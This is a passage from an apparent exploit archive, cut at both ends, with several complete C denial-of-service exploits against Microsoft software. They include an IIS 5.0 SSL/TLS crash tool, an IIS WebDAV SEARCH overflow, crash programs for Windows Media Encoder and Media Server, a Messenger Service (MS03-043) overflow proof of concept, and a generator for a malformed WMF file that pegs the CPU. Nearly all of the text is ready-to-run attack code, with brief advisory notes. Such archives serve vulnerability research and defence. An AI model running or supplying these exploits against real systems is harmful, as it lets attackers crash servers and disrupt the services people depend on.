,0x91,0x0E,0xE5,0x32,0x90,0xCD,0xB4,0xC5,0xD6,0x30,0x01,0xCD,0x83,0x29,0xDA
,0x4D,0xA5,0x51,0x0B,0x95,0xDC,0xF0,0x83,0x3C,0x81,0x18,0x3D,0x90,0x83,0x16
,0x03,0x00,0x00,0x86,0x0F,0x00,0x00,0x82,0x00,0x80,0xC0,0x56,0x18,0x55,0x92
,0xEF,0x42,0xC2,0x96,0xB5,0x9D,0x81,0x9D,0x3E,0x2A,0x9C,0x60,0x9B,0x9F,0x65
,0xF7,0xFF,0xD0,0xE8,0x2E,0xB9,0x58,0x3A,0xDC,0x68,0xA3,0xBD,0x05,0x5B,0x28
,0x66,0xF5,0x23,0x87,0xE7,0x0C,0xCE,0xD1,0x07,0x4D,0x8D,0xB8,0x40,0x86,0x12
,0xFF,0x60,0x73,0x0F,0xA6,0x91,0x71,0xAC,0x23,0xCC,0x5A,0xB1,0x5C,0xAD,0x62
,0xD5,0xE9,0x73,0xC7,0xCC,0x13,0x95,0x08,0xCE,0xD9,0x75,0xB4,0xB1,0xE5,0x46
,0x0C,0x85,0xE1,0x50,0x1A,0xBC,0x53,0x4B,0xD1,0x5B,0x1A,0xD7,0x7A,0xD7,0x47
,0xC5,0xFC,0x5B,0xA8,0x19,0xB8,0x6D,0xF6,0xD6,0x7B,0x97,0x38,0xD4,0x71,0x3E
,0x60,0xA3,0xCB,0x02,0x4C,0xB5,0x26,0xEE,0xB4,0xF9,0x31,0x3F,0xB7,0xAE,0x65
,0xBC,0x4C,0x6F,0x14,0x03,0x00,0x00,0x01,0x01,0x16,0x03,0x00,0x00,0x40,0x72
,0x12,0x84,0x91,0x08,0x56,0xDC,0x9A,0x1F,0x49,0x35,0x9F,0xC7,0x70,0x16,0x14
,0xAE,0xED,0x32,0x89,0x46,0x10,0x18,0x73,0xB5,0x40,0xB7,0xBA,0xCC,0xB0,0x75
,0xCF,0x96,0x3E,0xDC,0x0F,0x97,0xEE,0xDC,0x3A,0x0F,0xB7,0xD2,0xCD,0x8B,0x0C
,0x99,0xDB,0xA6,0x1E,0xD0,0xF9,0x32,0xCD,0x3B,0xE6,0x32,0xBD,0xC4,0xA9,0x62
,0x2F,0xD5,0xC6};


struct ssl_hello {
char handshake;
short version;
short length;
char client_hello;
char client_length[3];
short client_version;
int timestamp;
char random_bytes[28];
char session_id_length;
char session_id[32];
short cipher_length;
char cipher_suite[52];
char compression_length;
char compression_method;
} __attribute__((packed)) ssl_hello;

int tls;


int 
main(int argc, char *argv[])
{
struct sockaddr_in addr;
int sock,i;
char buffer[32];

setvbuf(stdout, NULL, _IONBF, 0);

printf("\n<*> S21sec Microsoft IIS 5.0 SSL/TLS Remote DoS <*>\n\n");

tls=0;

if ((argc != 4) && (argc != 3))
{
printf(" Usage: %s [host] [port] {t}\n", argv[0]);
printf(" host - Host (name/IP) to connect to.\n");
printf(" port - TCP port to connect to.\n");
printf(" t - Enable TLS (disabled by default).\n\n");
exit(1);
}

if (argc == 4)
{
if ( strcmp(argv[3], "t"))
{
printf(" -> Ouch!! What is '%s'?\n\n",argv[3]);
exit(1);
}
else
{
tls=1;
bin_data[2]=0x01;
}
}

memset(&addr, 0, sizeof(addr));

addr.sin_family = AF_INET;
addr.sin_port = htons(atoi(argv[2]));

if ( exist_host( argv[1], (u_long *)&(addr.sin_addr.s_addr) ) )
{
printf(" -> Ouch!! Wrong or nonexistant host '%s'!!\n\n",argv[1]);
exit(1);
}

if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) 
{
printf(" -> Error on socket(): %s\n", strerror(errno));
exit(1);
}

printf(" -> Connecting to %s:%s...",argv[1],argv[2]);
if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1) 
{
printf("\n -> Error on connect(): %s\n", strerror(errno));
exit(1);
}

init_hello();

printf(" OK\n -> Sending %s Client Hello...",((tls)?"TLS":"SSL"));
if (write(sock, (void *)&ssl_hello, sizeof(struct ssl_hello)) == -1)
{
printf("\n -> Error on write(): %s\n", strerror(errno));
exit(1);
}

printf(" OK\n -> Waiting for %s Server Hello...",((tls)?"TLS":"SSL"));
if (read(sock, (void *)buffer, sizeof(buffer)) == -1)
{
printf("\n -> Error on read(): %s\n", strerror(errno));
exit(1);
}

printf(" OK\n -> Sending bomb...");
if (write(sock, (void *)bin_data, sizeof(bin_data)) == -1)
{
printf("\n -> Error on write(): %s\n", strerror(errno));
exit(1);
}

for (i=0; i<6 ; i++)
{
printf(" B00M!!");
usleep(350000);
}

close(sock);

printf("\n ->\n -> OK. If DoS has been worked you will not be able to negotiate %s with %s:%s\n\n",
((tls)?"TLS":"SSL"),argv[1],argv[2]);

exit(0);
}


int
exist_host( char *nom_host, u_long *bin_host )
{
struct hostent *hinfo;
struct sockaddr_in host_tmp;
struct in_addr host_binario;

memset( (char *)&host_tmp, 0, sizeof(host_tmp) );
memset( (char *)&host_binario, 0, sizeof(host_binario) );

host_tmp.sin_family = AF_INET;

if ( inet_aton( nom_host, &host_binario) )
{
memcpy( (char *)bin_host, (char *)&host_binario, sizeof(host_binario));
return 0;
}

if ( (hinfo = gethostbyname( nom_host )) ) /* Put nom_host into bin_host */
{
memcpy((char *)&host_tmp.sin_addr, hinfo->h_addr, hinfo->h_length);
memcpy((char *)bin_host, (char *) &host_tmp.sin_addr.s_addr,
sizeof( host_tmp.sin_addr.s_addr));
return 0;
}

return 1;
}


void 
init_hello(void)
{
ssl_hello.handshake = 0x16;

if (!tls)
ssl_hello.version = htons(0x0300);
else
ssl_hello.version = htons(0x0301);

ssl_hello.length = htons(0x007f);
ssl_hello.client_hello = 0x01;

memcpy((void *)ssl_hello.client_length, (void *)"\x00\x00\x7b", 3);

if (!tls)
ssl_hello.client_version = htons(0x0300);
else
ssl_hello.client_version = htons(0x0301);

ssl_hello.timestamp = htonl(0x407babc0);

memset((void *) ssl_hello.random_bytes, 0x66, 28);

ssl_hello.session_id_length = 0x20;

memset((void *) ssl_hello.session_id, 0x66, 32);

ssl_hello.cipher_length = htons(0x0034);

memcpy((void *)ssl_hello.cipher_suite, (void *)cipher_suites, sizeof(cipher_suites));

ssl_hello.compression_length = 0x01;
ssl_hello.compression_method = 0x00;
}




// milw0rm.com [2004-04-14]
/*

Microsoft IIS versions 5.0 and 5.1 remote denial of service exploit 

that makes use of the vulnerability recently published by SPI dynamics

Published on 31.05.2003

*/

#include <windows.h>
#include <winsock.h>
#include <stdio.h>

#pragma comment (lib,"ws2_32")

void graphitte()

{printf("\n********************************** ");
printf("\n   Webdav MICROSOFT IIS DoS Exploit     * \n");
printf("+++++++++++++++++++++++++++++++*\n");
printf(" by Shachank Pandrey                                *\n");
printf("*************************************\n");

}

char *funk(char tobesent[100],char *host)
{
int s; char got[100]; 

WSADATA wsaData;

struct hostent *yo;
struct sockaddr_in heck;

char lala[100];


if(WSAStartup(0x0101,&wsaData)!=0) {
printf("error starting winsock..");
return 0;
}

if ((yo = gethostbyname(host))==0){
printf("error: can't resolve '%s'",host);
return 0;
}


heck.sin_port = htons(80);
heck.sin_family = AF_INET;
heck.sin_addr = *((struct in_addr *)yo->h_addr);

if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1){
printf("Error: Unable to create socket");

}


if ((connect(s, (struct sockaddr *) &heck, sizeof(heck))) == -1){
printf("Error: Cudn't Connect\r\n");

}

memset(lala,0,sizeof(lala));

sprintf(lala,"%s",tobesent,sizeof(tobesent));

send(s,lala,strlen(lala),0);
recv(s,got,100,0);

return got;
closesocket(s);
WSACleanup();
printf("done.\n");

}


int main(int argc, char *argv[])
{

WSADATA wsaData;

int s;char mysend[100];
char *gotme;
char trash[100];


struct hostent *yo;
struct sockaddr_in heck;
char buffer[65535] ="";
char myrequest[80000]; 
char content[] =
"<?xml version=\"1.0\"?>\r\n"
"<g:searchrequest xmlns:g=\"DAV:\">\r\n"
"<g:sql>\r\n"
"Select \"DAV:displayname\" from scope()\r\n"
"</g:sql>\r\n"
"</g:searchrequest>\r\n";



graphitte();

if(WSAStartup(0x0101,&wsaData)!=0) {
printf("Error :Cudn't initiate winsock!");
return 0;
}

if(argc<2)

{printf("\nUsage : %s <I.P./Hostname>\n\n",argv[0]);
exit(0);}

if ( (yo = gethostbyname(argv[1]))==0)
{
printf("error: can't resolve '%s'",argv[1]);
return 1;
}

printf("\nChecking web server %s\n",argv[1]);
gotme=(char *)funk("GET / HTTP/1.0\r\n\n",argv[1]);


if (strstr(gotme,"IIS/5.0") == NULL)

{ printf("\n\r----> %s is not running IIS 5.0! adios !\n",argv[1]); } 


else

{ 

printf("\n\r----> Aww rite! IIS 5.0 found on %s !\n",argv[1]);

sprintf(mysend,"SEARCH / HTTP/1.0\r\n\n",40);

gotme=(char *)funk(mysend,argv[1]);

if (strstr(gotme,"HTTP/1.1 411 Length Required") != NULL)

{ printf("\n\r----> METHOD SEARCH ALLOWED\r\n"); } 


else

{

printf("\n----> Method SEARCH not Allowed ! adios...\n");
exit(0);

} 

heck.sin_port = htons(80);
heck.sin_family = AF_INET;
heck.sin_addr = *((struct in_addr *)yo->h_addr);

if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1){
printf("error: can't create socket");
return 1;
}


if ((connect(s, (struct sockaddr *) &heck, sizeof(heck))) == -1){
printf("Error:Cudn't Connect\r\n");
return 1;
}

buffer[sizeof(buffer)]=0x00;

memset(buffer,'S',sizeof(buffer));
memset(myrequest,0,sizeof(myrequest));
memset(trash,0,sizeof(trash));
sprintf(myrequest,"SEARCH /%s HTTP/1.1\r\nHost: %s\r\
nContent-type: text/xml\r\nContent-Length: ",buffer,argv[1]);
sprintf(myrequest,"%s%d\r\n\r\n",myrequest,strlen(content));
printf("\r\nDoSsing the server...<pray>\n");
send(s,myrequest,strlen(myrequest),0);

send(s,content,strlen(content),0);

recv(s,trash,sizeof(trash),0);
if(trash[0]==0x00) 
{
printf("Server is DoSsed! Now run !! F-B-eyee is after j00...\r\n");

} 
else

printf("Server is prolly patched.\r\n");

closesocket(s);


}

WSACleanup();

return 1;
}

// milw0rm.com [2003-05-31]
source: http://www.securityfocus.com/bid/1282/info

Windows Media Encoder is part of Windows Media Services. It's purpose is to convert content into a suitable format for video or audio streaming through the Media Services.

If a specially malformed request is sent to the Windows Media Encoder it could cause the service to crash. The service would need to be restarted in order to regain normal functionality.

/*
 *
 * Media Streaming Broadcast Distribution (MSBD)
 * Denial of Service Attack
 *
 * (C) 2000 Kit Knox <kit@rootshell.com> - Public Release: 05/31/00
 *
 * Causes the Windows Media Encoder to crash with a "Runtime Error!"
 *
 * "NSREX caused an invalid page fault in module MFC42.DLL at 0177:5f4012a1".
 *
 * Tested on version 4.1.0.3920 file "NsRex.exe" 998KB 1/11/00.
 *
 * Official Microsoft patch is available :
 *
 * http://www.microsoft.com/technet/security/bulletin/ms00-038.asp
 *
 * Thanks to Microsoft and the WMT group for their prompt attention to this
 * matter.
 *
 */

#include <stdio.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

char bogus_msbd_packet1[] = {
0x4d, 0x53, 0x42, 0x20, 0x06, 0x01, 0x07, 0x00, 0x24, 0x00, 0x00, 0x40,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x4e, 0x00,
0x65, 0x00, 0x74, 0x00, 0x00, 0x50, 0x53, 0x00, 0x68, 0x00, 0x6f, 0x00,
0x77, 0x00, 0x00, 0x00
};

int sock;
 
int main(int argc, char *argv[]) {
  struct hostent *he;
  struct sockaddr_in sa;
  char buf[1024];
  
  if (argc != 2) {
    fprintf(stderr, "usage: %s <host/ip>\n", argv[0]);
    return(-1);
  }
  
  sock = socket ( AF_INET, SOCK_STREAM, 0);
  sa.sin_family = AF_INET;
  sa.sin_port = htons(7007);
  he = gethostbyname (argv[1]);
  if (!he) {
    if ((sa.sin_addr.s_addr = inet_addr(argv[1])) == INADDR_NONE)
      return(-1);
  } else {
    bcopy(he->h_addr, (struct in_addr *) &sa.sin_addr, he->h_length);
  }
  if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0) {
    fprintf(stderr, "Fatal Error: Can't connect to Windows Media Encoder.\n");
    return(-1);
  }
  write(sock, bogus_msbd_packet1, sizeof(bogus_msbd_packet1));
  for (;;) {
    read(sock, buf, sizeof(buf));
  }
}

source: http://www.securityfocus.com/bid/1000/info

Misordered handshake sequences sent to a Windows Media Unicast Server via Windows Media Player will cause the server to crash. Restarting the Unicast Service, including any open sessions during the time of the crash, is required in order to regain normal functionality. This is due to the dependency of the application on successfully completing asychronous handshake requests in a proper sequential order between the client and the server.

/*
 *
 * Jan-18-2000
 *
 * [ http://www.rootshell.com/ ]
 *
 * Microsoft Media Server 4.1 - Denial of Service Attack
 *
 * This code will crash the Microsoft Media Unicast Server for
 * Windows NT.  We have tested this against machines running SP4
 * and SP6.
 *
 * We have seen the entire machine become very unstable following
 * the crash of the unicast server.
 *
 * Notified secure@microsoft.com Jan-18-2000 at 11:30 AM.
 * Microsoft advisory released Feb-23-2000.
 *
 * http://www.microsoft.com/technet/security/bulletin/fq00-013.asp
 *
 */

#include <stdio.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

char packet1[] = {
0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0xa0, 0x00, 0x00, 0x00,
0x4d, 0x4d, 0x53, 0x20, 0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xf8, 0x53, 0xe3, 0xa5, 0x9b, 0xc4, 0x00, 0x40, 0x12, 0x00, 0x00, 0x00,
0x01, 0x00, 0x03, 0x00, 0xf0, 0xf0, 0xf0, 0xf0, 0x0b, 0x00, 0x04, 0x00,
0x1c, 0x00, 0x03, 0x00, 0x4e, 0x00, 0x53, 0x00, 0x50, 0x00, 0x6c, 0x00,
0x61, 0x00, 0x79, 0x00, 0x65, 0x00, 0x72, 0x00, 0x2f, 0x00, 0x34, 0x00,
0x2e, 0x00, 0x31, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x2e, 0x00, 0x33, 0x00,
0x38, 0x00, 0x35, 0x00, 0x37, 0x00, 0x3b, 0x00, 0x20, 0x00, 0x7b, 0x00,
0x30, 0x00, 0x32, 0x00, 0x64, 0x00, 0x30, 0x00, 0x63, 0x00, 0x32, 0x00,
0x63, 0x00, 0x30, 0x00, 0x2d, 0x00, 0x62, 0x00, 0x35, 0x00, 0x30, 0x00,
0x37, 0x00, 0x2d, 0x00, 0x31, 0x00, 0x31, 0x00, 0x64, 0x00, 0x32, 0x00,
0x2d, 0x00, 0x39, 0x00, 0x61, 0x00, 0x61, 0x00, 0x38, 0x00, 0x2d, 0x00,
0x62, 0x00, 0x37, 0x00, 0x30, 0x00, 0x66, 0x00, 0x33, 0x00, 0x30, 0x00,
0x34, 0x00, 0x34, 0x00, 0x61, 0x00, 0x65, 0x00, 0x37, 0x00, 0x65, 0x00,
0x7d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

char packet2[] = {
0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x20, 0x00, 0x00, 0x00,
0x4d, 0x4d, 0x53, 0x20, 0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
0x5e, 0xba, 0x49, 0x0c, 0x02, 0x2b, 0x01, 0x40, 0x02, 0x00, 0x00, 0x00,
0x18, 0x00, 0x03, 0x00, 0xf1, 0xf0, 0xf0, 0xf0, 0x0b, 0x00, 0x04, 0x00
};

char packet3[] = {
0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x60, 0x00, 0x00, 0x00,
0x4d, 0x4d, 0x53, 0x20, 0x0c, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
0x83, 0xc0, 0xca, 0xa1, 0x45, 0xb6, 0x01, 0x40, 0x0a, 0x00, 0x00, 0x00,
0x02, 0x00, 0x03, 0x00, 0xf1, 0xf0, 0xf0, 0xf0, 0xff, 0xff, 0xff, 0xff,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa0, 0x00, 0x02, 0x00, 0x00, 0x00,
0x5c, 0x00, 0x5c, 0x00, 0x31, 0x00, 0x39, 0x00, 0x32, 0x00, 0x2e, 0x00,
0x31, 0x00, 0x36, 0x00, 0x38, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x2e, 0x00,
0x32, 0x00, 0x5c, 0x00, 0x54, 0x00, 0x43, 0x00, 0x50, 0x00, 0x5c, 0x00,
0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 0x00, 0x00, 0x32, 0x00,
0x63, 0x00, 0x30, 0x00
};


char packet4[] = {
0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x88, 0x00, 0x00, 0x00,
0x4d, 0x4d, 0x53, 0x20, 0x11, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00,
0x2b, 0x87, 0x16, 0xd9, 0xce, 0xf7, 0x01, 0x40, 0x0f, 0x00, 0x00, 0x00,
0x05, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0x00, 0x68, 0x00,
0x65, 0x00, 0x20, 0x00, 0x45, 0x00, 0x61, 0x00, 0x67, 0x00, 0x6c, 0x00,
0x65, 0x00, 0x73, 0x00, 0x20, 0x00, 0x54, 0x00, 0x65, 0x00, 0x71, 0x00,
0x75, 0x00, 0x69, 0x00, 0x6c, 0x00, 0x61, 0x00, 0x20, 0x00, 0x53, 0x00,
0x75, 0x00, 0x6e, 0x00, 0x72, 0x00, 0x69, 0x00, 0x73, 0x00, 0x65, 0x00,
0x20, 0x00, 0x32, 0x00, 0x38, 0x00, 0x6b, 0x00, 0x2f, 0x00, 0x65, 0x00,
0x61, 0x00, 0x67, 0x00, 0x6c, 0x00, 0x65, 0x00, 0x73, 0x00, 0x32, 0x00,
0x38, 0x00, 0x2e, 0x00, 0x61, 0x00, 0x73, 0x00, 0x66, 0x00, 0x00, 0x00,
0x62, 0x00, 0x37, 0x00, 0x30, 0x00, 0x66, 0x00
};

char packet5[] = {
0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x48, 0x00, 0x00, 0x00,
0x4d, 0x4d, 0x53, 0x20, 0x09, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
0x67, 0x66, 0x66, 0x66, 0x66, 0x66, 0x02, 0x40, 0x07, 0x00, 0x00, 0x00,
0x15, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
0x65, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0xac, 0x40, 0x02, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00
};

char packet6[] = {
0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x30, 0x00, 0x00, 0x00,
0x4d, 0x4d, 0x53, 0x20, 0x06, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
0x0a, 0xd7, 0xa3, 0x70, 0x3d, 0x0a, 0x11, 0x40, 0x04, 0x00, 0x00, 0x00,
0x33, 0x00, 0x03, 0x00, 0x02, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00,
0x00, 0x00, 0xff, 0xff, 0x02, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
0x65, 0x00, 0x20, 0x00
};

char packet7[] = {
0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x38, 0x00, 0x00, 0x00,
0x4d, 0x4d, 0x53, 0x20, 0x07, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00,
0x2f, 0xdd, 0x24, 0x06, 0x81, 0x15, 0x11, 0x40, 0x05, 0x00, 0x00, 0x00,
0x07, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0x16, 0xca, 0x03, 0x80, 0x04, 0x00, 0x00, 0x00
};

int sock;

int main(int argc, char *argv[]) {
  struct hostent *he;
  struct sockaddr_in sa;
  char buf[1024];
  
  if (argc != 2) {
    fprintf(stderr, "usage: %s <host/ip>\n", argv[0]);
    return(-1);
  }
  
  sock = socket ( AF_INET, SOCK_STREAM, 0);
  sa.sin_family = AF_INET;
  sa.sin_port = htons(1755);
  he = gethostbyname (argv[1]);
  if (!he) {
    if ((sa.sin_addr.s_addr = inet_addr(argv[1])) == INADDR_NONE)
      return(-1);
  } else {
    bcopy(he->h_addr, (struct in_addr *) &sa.sin_addr, he->h_length);
  }
  if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0) {
    fprintf(stderr, "Fatal Error: Can't connect to Microsoft Media Server.\n");
    return(-1);
  }
  write(sock, packet1, sizeof(packet1));
  write(sock, packet2, sizeof(packet2));
  write(sock, packet3, sizeof(packet3));
  write(sock, packet4, sizeof(packet4));
  write(sock, packet5, sizeof(packet5));
  write(sock, packet6, sizeof(packet6));
  write(sock, packet7, sizeof(packet7));
  for (;;) {
    read(sock, buf, sizeof(buf));
  }
}/*

DoS Proof of Concept for MS03-043 - exploitation shouldn't be too hard.
Launching it one or two times against the target should make the 
machine reboot. Tested against a Win2K SP4.

"The vulnerability results because the Messenger Service does not 
properly validate the length of a message before passing it to the allocated 
buffer" according to MS bulletin. Digging into it a bit more, we find that when 
a character 0x14 in encountered in the 'body' part of the message, it is 
replaced by a CR+LF. The buffer allocated for this operation is twice the size 
of the string, which is the way to go, but is then copied to a buffer which 
was only allocated 11CAh bytes. Thanks to that, we can bypass the length checks 
and overflow the fixed size buffer.

Credits go to LSD :)

*/

#include <stdio.h>
#include <winsock.h>
#include <string.h>
#include <time.h>

// Packet format found thanks to a bit a sniffing
static unsigned char packet_header[] =
"\x04\x00\x28\x00"
"\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xf8\x91\x7b\x5a\x00\xff\xd0\x11\xa9\xb2\x00\xc0"
"\x4f\xb6\xe6\xfc"
"\xff\xff\xff\xff" // @40 : unique id over 16 bytes ?
"\xff\xff\xff\xff"
"\xff\xff\xff\xff"
"\xff\xff\xff\xff"
"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\xff\xff\xff\xff"
"\xff\xff\xff\xff" // @74 : fields length
"\x00\x00";

// Exploit downloaded on www.k-otik.com
unsigned char field_header[] =
"\xff\xff\xff\xff" // @0 : field length
"\x00\x00\x00\x00"
"\xff\xff\xff\xff"; // @8 : field length

int main(int argc,char *argv[])
{
	int i, packet_size, fields_size, s;
	unsigned char packet[8192];
	struct sockaddr_in addr;
	// A few conditions :
	// 0 <= strlen(from) + strlen(machine) <= 56
	// max fields size 3992
	char from[] = "RECCA";
	char machine[] = "ZEUS";
	char body[4096] = "*** MESSAGE ***";

	WSADATA wsaData;

	WSAStartup(0x0202, &wsaData);

	ZeroMemory(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr("192.168.186.3");
	addr.sin_port = htons(135);

	ZeroMemory(packet, sizeof(packet));
	packet_size = 0;

	memcpy(&packet[packet_size], packet_header, sizeof(packet_header) - 
1);
	packet_size += sizeof(packet_header) - 1;

	i = strlen(from) + 1;
	*(unsigned int *)(&field_header[0]) = i;
	*(unsigned int *)(&field_header[8]) = i;
	memcpy(&packet[packet_size], field_header, sizeof(field_header) - 1);
	packet_size += sizeof(field_header) - 1;
	strcpy(&packet[packet_size], from);
	packet_size += (((i - 1) >> 2) + 1) << 2; // padded to a multiple of 4

	i = strlen(machine) + 1;
	*(unsigned int *)(&field_header[0]) = i;
	*(unsigned int *)(&field_header[8]) = i;
	memcpy(&packet[packet_size], field_header, sizeof(field_header) - 1);
	packet_size += sizeof(field_header) - 1;
	strcpy(&packet[packet_size], machine);
	packet_size += (((i - 1) >> 2) + 1) << 2; // padded to a multiple of 4

	fprintf(stdout, "Max 'body' size (incl. terminal NULL char) = %d\n", 
3992 - packet_size + sizeof(packet_header) - sizeof(field_header));
	memset(body, 0x14, sizeof(body));
	body[3992 - packet_size + sizeof(packet_header) - sizeof(field_header) 
- 1] = '\0';

	i = strlen(body) + 1;
	*(unsigned int *)(&field_header[0]) = i;
	*(unsigned int *)(&field_header[8]) = i;
	memcpy(&packet[packet_size], field_header, sizeof(field_header) - 1);
	packet_size += sizeof(field_header) - 1;
	strcpy(&packet[packet_size], body);
	packet_size += i;

	fields_size = packet_size - (sizeof(packet_header) - 1);
	*(unsigned int *)(&packet[40]) = time(NULL);
	*(unsigned int *)(&packet[74]) = fields_size;

	fprintf(stdout, "Total length of strings = %d\nPacket size = 
%d\nFields size = %d\n", strlen(from) + strlen(machine) + strlen(body), 
packet_size, fields_size);

/*
	for (i = 0; i < packet_size; i++)
	{
		if (i && ((i & 1) == 0))
			fprintf(stdout, " ");
		if (i && ((i & 15) == 0))
			fprintf(stdout, "\n");
		fprintf(stdout, "%02x", packet[i]);
	}
	fprintf(stdout, "\n");
*/
	if ((s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
		exit(EXIT_FAILURE);

	if (sendto(s, packet, packet_size, 0, (struct sockaddr *)&addr, 
sizeof(addr)) == -1)
		exit(EXIT_FAILURE);
/*
	if (recvfrom(s, packet, sizeof(packet) - 1, 0, NULL, NULL) == -1)
		exit(EXIT_FAILURE);
*/

	exit(EXIT_SUCCESS);
}

// milw0rm.com [2003-10-18]
/*
 * Author: Winny Thomas
 *	   Pune, INDIA
 *
 * The crafted metafile from this code when viewed in internet explorer raises the CPU utilization 
 * to 100%. The code was tested on Windows 2000 server SP4. The issue does not occur with the 
 * hotfix for GDI (MS05-053) installed
 *
 * Disclaimer: This code is for educational/testing purposes by authosized persons on 
 * networks/systems setup for such a purpose.The author of this code shall not bear 
 * any responsibility for any damage caused by using this code.
 *
 */

#include <stdio.h>

unsigned char wmfheader[] = 
"\xd7\xcd\xc6\x9a\x00\x00\xc6\xfb\xca\x02\xaa\x02\x39\x09\xe8\x03"
"\x00\x00\x00\x00\x66\xa6"
"\x01\x00"
"\x09\x00"
"\x00\x03"
"\xff\xff\xff\xff" //Metafile file size
"\x04\x00"
"\xff\xff\xff\xff" //Largest record size
"\x00\x00";

unsigned char MetafileRECORD[] = 
"\x05\x00\x00\x00\x0b\x02\x39\x09\xc6\xfb\x08\x00\x00\x00\xfa\x02"
"\x05\x00\x00\x00\x00\x00\xff\xff\xff\x00\x04\x00\x00\x00\x2d\x01"
"\x01\x00\x04\x00\x00\x00\x06\x01\x01\x00\x04\x00\x00\x00\x2d\x01"
"\x02\x00\x07\x00\x00\x00\xfc\x02\x00\x00\xff\xff\xff\x00\x00\x00"
"\x04\x00\x00\x00\x2d\x01\x03\x00\x04\x00\x00\x00\x2d\x01\x02\x00"
"\x04\x00\x00\x00\x2d\x01\x03\x00\x04\x00\x00\x00\xf0\x01\x00\x00"
"\x07\x00\x00\x00\xfc\x02\x00\x00\xfa\x94\x93\x00\x00\x00\x04\x00"
"\x00\x00\x2d\x01\x00\x00\x04\x00\x00\x00\x2d\x01\x01\x00\x04\x00"
"\x00\x00\x06\x01\x01\x00\x14\x00\x00\x00\x24\x03\x08\x00\xc6\xfb"
"\x9b\x03\xbc\xfe\x9b\x03\x0f\x01\x1a\x07\xa5\x02\x1a\x07\xf4\x00"
"\x39\x09\xd5\xfc\x36\x07\x86\xfe\x36\x07\xc6\xfb\x9b\x03";

unsigned char wmfeof[] = 
"\x00\x00\x00\x00";

int main(int argc, char *argv[])
{
	FILE *fp;
	char wmfbuf[1024];
	int metafilesize, metafilesizeW, i, j;
	
	metafilesize = sizeof (wmfheader) + sizeof (MetafileRECORD) + sizeof(wmfeof) -3;
	metafilesizeW = metafilesize/2;
	memcpy((unsigned long *)&wmfheader[28], &metafilesizeW, 4);

	printf("[*] Adding Metafile header\n");
	for (i = 0; i < sizeof(wmfheader) -1; i++) {
		(unsigned char)wmfbuf[i] = (unsigned char)wmfheader[i];
	}
			
	printf("[*] Adding Metafile records\n");
	for (j = i, i = 0; i < sizeof(MetafileRECORD) -1; i++, j++) {
		wmfbuf[j] = MetafileRECORD[i];
	}
	
	printf("[*] Adding EOF record\n");
	for (i = 0; i < sizeof(wmfeof) -1; i++, j++) {
		wmfbuf[j] = wmfeof[i];
	}

	printf("[*] Creating Metafile (MS053.wmf)\n");
	fp = fopen("MS053.wmf", "wb");
	fwrite(wmfbuf, 1, metafilesize, fp);
	fclose(fp);
}

// milw0rm.com [2005-11-29]
/*
 * Author: Winny Thomas
 *         Pune, INDIA
 *
 * The crafted metafile (WMF) from this code when viewed in explorer crashes it. The issue is seen
 * when the field 'mtNoObjects' in the Metafile header is set to 0x0000.
 * The code was tested on Windows 2000 server SP4. The issue does not occur with the  
 * hotfix for GDI (MS05-053) installed.
 *
 * Disclaimer: This code is for educational/testing purposes by authorized persons on 
